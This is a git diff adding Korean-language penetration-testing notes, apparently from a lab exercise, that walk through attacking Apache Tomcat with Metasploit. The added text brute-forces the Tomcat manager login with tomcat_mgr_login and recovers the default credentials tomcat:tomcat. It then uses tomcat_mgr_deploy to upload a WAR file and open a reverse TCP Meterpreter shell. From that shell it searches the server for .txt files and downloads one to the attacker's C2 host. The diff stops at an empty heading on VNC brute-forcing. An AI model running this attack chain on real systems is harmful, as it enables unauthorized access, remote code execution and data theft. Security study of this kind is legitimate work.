@@ -263,3 +263,79 @@ cmd 인자에 Linux 명령어를 실행하면 해당 명령어가 실행된 결�
 
 ## 메타스플로잇을 활용한 Tomcat 관리자 계정 무작위 대입 공격 자동화
 
+```
+msf6 > search tomcat mgr
+```
+-tomcat manager 페이지 대상으로 공격 진행하기 위한 툴 검색
+
+```
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+```
+-tool 선택
+
+```
+msf6 > set RHOSTS [ip]
+msf6 > set RPORT [port]
+msf6 > set THREADS 5
+msf6 > set STOP_ON_SUCCESS true
+```
+-RHOSTS, RPORT, THREADS 설정 후, STOP_ON_SUCCESS는 공격이 성공한 후 정지.
+
+```
+msf6 > exploit
+```
+-exploit 시작
+
+```
+tomcat:tomcat
+```
+이라는 ID:PW를 확인할 수 있음.
+
+---
+
+## 메타스플로잇을 활용한 Tomcat 시스템 침투 및 리버스 공격
+
+공격도구: search시, exploit으로 시작한다.
+
+```
+msf6 > use exploit/multi/http/tomcat_mgr_deploy
+```
+-공격 도구 설정
+
+show options시, LHOST, LPORT와 같은 Listening 옵션 설정해야 함.
+
+```
+msf6 > set HttpUsername tomcat
+msf6 > set HttpPassword tomcat
+msf6 > set RHOSTS [대상 ip]
+msf6 > set RPORT [대상 port]
+msf6 > exploit
+```
+-설정 후, exploit 시작
+
+Server username: tomcat55
+
+```
+Started reverse TCP handler on [ip:port]
+Uploading 6217 bytes as WeEGsVHbviKTZ.war ...
+Executing /WeEGsVHbviKTZ/oSAFmO.jsp ...
+Undeploying WeEGsVHbviKTZ.war ...
+```
+-msf는 RCE를 통해 Tomcat mgr 페이지에 war파일을 업로드, 그 안에 있는 jsp 코드를 실행시킨 뒤, 흔적을 제거하는 과정을 수행한다.
+- 공격자는 tomcat mgr 페이지에 RCE 접근이 가능함.
+- 리눅스 명령어와 비슷한 명령어들을 수행 가능함. (search 같은 명령어들도 사용 가능.)
+
+```
+meterpreter > search -f *.txt
+```
+-.txt로 된 파일들 전부 찾는 명령어
+
+```
+meterpreter > download /var/www/twiki/readme.txt
+```
+-서버에 있는 파일을 로컬(C2 서버)로 download 가능.
+
+---
+
+## 메타스플로잇을 활용한 VNC 무작위 대입공격 원격 접속 성공
+
